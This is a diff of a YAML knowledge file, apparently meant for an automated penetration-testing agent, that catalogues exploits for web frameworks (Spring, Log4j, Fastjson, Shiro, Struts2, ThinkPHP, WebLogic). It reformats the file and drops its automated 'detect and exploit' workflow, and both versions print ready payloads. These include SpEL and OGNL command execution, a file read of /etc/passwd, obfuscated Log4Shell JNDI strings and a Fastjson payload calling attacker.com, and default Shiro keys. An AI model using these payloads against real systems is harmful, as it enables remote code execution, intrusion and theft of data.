@@ -1,203 +1,26 @@
-name: "框架安全测试"
-description: "Spring、Django、Flask等框架安全测试"
-domain: "web"
-version: "1.0"
+name: 框架安全测试
+description: Spring、Django、Flask等框架安全测试
+domain: web
+version: '1.0'
 tags:
-  - web
-  - framework
-  - spring
-  - django
-
-knowledge: |
-  # 框架漏洞
-  
-  ## 1. Spring Boot Actuator
-  
-  ### 端点探测
-  
-  ```
-  /actuator
-  /actuator/env
-  /actuator/health
-  /actuator/heapdump
-  /actuator/loggers
-  /actuator/refresh
-  /actuator/mappings
-  ```
-  
-  ### 利用
-  
-  ```
-  # 获取环境变量
-  /actuator/env
-  
-  # 触发RCE
-  /actuator/refresh
-  POST: {"name":"test","value":"#{T(java.lang.Runtime).getRuntime().exec('whoami')}"}
-  ```
-  
-  ---
-  
-  ## 2. Spring SpEL注入
-  
-  ### 基础RCE
-  
-  ```
-  ${T(java.lang.Runtime).getRuntime().exec('id')}
-  ```
-  
-  ### 读取文件
-  
-  ```
-  ${T(org.apache.commons.io.FileUtils).readFileToString(T(java.io.File).new('/etc/passwd'))}
-  ```
-  
-  ---
-  
-  ## 3. Log4j RCE (CVE-2021-44228)
-  
-  ### 基础Payload
-  
-  ```
-  ${jndi:ldap://attacker.com/a}
-  ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
-  ```
-  
-  ### 变形Payload
-  
-  ```
-  ${jndi:rmi://attacker.com/Exploit}
-  ${jndi:ldap://attacker.com/Exploit}
-  ${${lower:j}ndi:${lower:l}dap://attacker.com/a}
-  ```
-  
-  ---
-  
-  ## 4. Fastjson反序列化
-  
-  ### 基础Payload
-  
-  ```json
-  {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}
-  ```
-  
-  ### JdbcRowSetImpl
-  
-  ```json
-  {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}
-  ```
-  
-  ---
-  
-  ## 5. Shiro反序列化
-  
-  ### RememberMe攻击
-  
-  1. 常见密钥:
-     - kPH+bIxk5D2deZiIxcaaaA==
-     - 4AvVhmFLUs0KTA3KprsdGv==
-     - etc.
-  
-  ### 利用工具
-  
-  ```bash
-  java -jar shiro-attack-2.0.jar
-  ```
-  
-  ---
-  
-  ## 6. Struts2 RCE
-  
-  ### 基础Payload
-  
-  ```
-  %{#a=(new java.lang.ProcessBuilder('id')).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[4096],#d.read(#e),#t=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#t.getWriter().write(new java.lang.String(#e))}
-  ```
-  
-  ---
-  
-  ## 7. ThinkPHP RCE
-  
-  ### 基础Payload
-  
-  ```
-  ?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
-  ```
-  
-  ---
-  
-  ## 8. Laravel RCE
-  
-  ### .env文件泄露
-  
-  ### 密钥利用
-  
-  ```
-  php artisan tinker
-  ```
-  
-  ---
-  
-  ## 9. WebLogic RCE
-  
-  ### XMLDecoder
-  
-  ```
-  POST /wls-wsat/CoordinatorPortType
-  Content-Type: text/xml
-  
-  <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
-  ...
-  ```
-  
-  ---
-  
-  ## 10. JBoss反序列化
-  
-  ### 攻击路径
-  
-  ```
-  /invoker/JMXInvokerServlet
-  /admin-console
-  ```
-  
-  ---
-  
-  ## 11. Django
-  
-  ### 任意文件读取
-  
-  ### SQL注入
-  
-  ---
-  
-  ## 12. Flask
-  
-  ### 模板注入
-  
-  ### Debug模式RCE
-  
-
-workflows:
-  - name: "自动检测和利用"
-    description: "自动检测漏洞并尝试利用"
-    steps:
-      - description: "信息收集和漏洞探测"
-        expected_output: "发现潜在漏洞点"
-      - description: "漏洞验证"
-        expected_output: "确认漏洞存在"
-      - description: "漏洞利用"
-        expected_output: "成功利用漏洞"
-
-tool_preferences:
-  nmap:
-    score: 0.8
-    reason: "端口和服务扫描"
-  nuclei:
-    score: 0.9
-    reason: "漏洞扫描"
-
-examples:
-  - scenario: "发现漏洞并获取敏感信息"
-    solution: "使用工具探测 -> 验证漏洞 -> 获取数据"
-    tools_used: ["nmap", "nuclei"]
+- web
+- framework
+- spring
+- django
+knowledge: "# 框架漏洞\n\n## 1. Spring Boot Actuator\n\n### 端点探测\n\n```\n/actuator\n/actuator/env\n/actuator/health\n/actuator/heapdump\n\
+  /actuator/loggers\n/actuator/refresh\n/actuator/mappings\n```\n\n### 利用\n\n```\n# 获取环境变量\n/actuator/env\n\n# 触发RCE\n/actuator/refresh\n\
+  POST: {\"name\":\"test\",\"value\":\"#{T(java.lang.Runtime).getRuntime().exec('whoami')}\"}\n```\n\n---\n\n## 2. Spring\
+  \ SpEL注入\n\n### 基础RCE\n\n```\n${T(java.lang.Runtime).getRuntime().exec('id')}\n```\n\n### 读取文件\n\n```\n${T(org.apache.commons.io.FileUtils).readFileToString(T(java.io.File).new('/etc/passwd'))}\n\
+  ```\n\n---\n\n## 3. Log4j RCE (CVE-2021-44228)\n\n### 基础Payload\n\n```\n${jndi:ldap://attacker.com/a}\n${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}\n\
+  ```\n\n### 变形Payload\n\n```\n${jndi:rmi://attacker.com/Exploit}\n${jndi:ldap://attacker.com/Exploit}\n${${lower:j}ndi:${lower:l}dap://attacker.com/a}\n\
+  ```\n\n---\n\n## 4. Fastjson反序列化\n\n### 基础Payload\n\n```json\n{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\"\
+  :\"ldap://attacker.com/Exploit\",\"autoCommit\":true}\n```\n\n### JdbcRowSetImpl\n\n```json\n{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"\
+  ,\"dataSourceName\":\"ldap://attacker.com/Exploit\",\"autoCommit\":true}\n```\n\n---\n\n## 5. Shiro反序列化\n\n### RememberMe攻击\n\
+  \n1. 常见密钥:\n   - kPH+bIxk5D2deZiIxcaaaA==\n   - 4AvVhmFLUs0KTA3KprsdGv==\n   - etc.\n\n### 利用工具\n\n```bash\njava -jar shiro-attack-2.0.jar\n\
+  ```\n\n---\n\n## 6. Struts2 RCE\n\n### 基础Payload\n\n```\n%{#a=(new java.lang.ProcessBuilder('id')).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new\
+  \ java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[4096],#d.read(#e),#t=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#t.getWriter().write(new\
+  \ java.lang.String(#e))}\n```\n\n---\n\n## 7. ThinkPHP RCE\n\n### 基础Payload\n\n```\n?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami\n\
+  ```\n\n---\n\n## 8. Laravel RCE\n\n### .env文件泄露\n\n### 密钥利用\n\n```\nphp artisan tinker\n```\n\n---\n\n## 9. WebLogic RCE\n\
+  \n### XMLDecoder\n\n```\nPOST /wls-wsat/CoordinatorPortType\nContent-Type: text/xml\n\n<soapenv:Envelope xmlns:soapenv=\"\
+  http://schemas.xmlsoap.org/soap/envelope/\">\n...\n```\n\n---\n\n## 10. JBoss反序列化\n\n### 攻击路径\n\n```\n/invoker/JMXInvokerServlet\n\
+  /admin-console\n```\n\n---\n\n## 11. Django\n\n### 任意文件读取\n\n### SQL注入\n\n---\n\n## 12. Flask\n\n### 模板注入\n\n### Debug模式RCE\n"
